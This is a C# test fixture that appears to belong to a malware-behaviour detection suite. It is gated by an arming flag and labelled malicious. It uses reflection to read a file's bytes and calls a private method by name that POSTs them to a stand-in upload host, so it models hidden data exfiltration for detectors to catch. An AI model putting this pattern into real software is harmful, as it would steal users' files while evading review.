// Inert fixture: never executed (gated by Arm.Armed). BF13 malicious: a sink reached by reflection, and a call by name to an own private method that posts.
using System;
using System.Net.Http;
using System.Reflection;

namespace Behaviour
{
    public static class Hidden
    {
        public static void Run(string path)
        {
            if (!Arm.Armed) return;
            var bytes = Type.GetType("System.IO.File").GetMethod("ReadAllBytes").Invoke(null, new object[] { path });
            typeof(Hidden).GetMethod("Post", BindingFlags.NonPublic | BindingFlags.Static).Invoke(null, new object[] { bytes });
        }

        private static void Post(byte[] data)
        {
            using var client = new HttpClient();
            client.PostAsync("https://example.test/silvergun-behaviour-suite/upload", new ByteArrayContent(data)).GetAwaiter().GetResult();
        }
    }
}
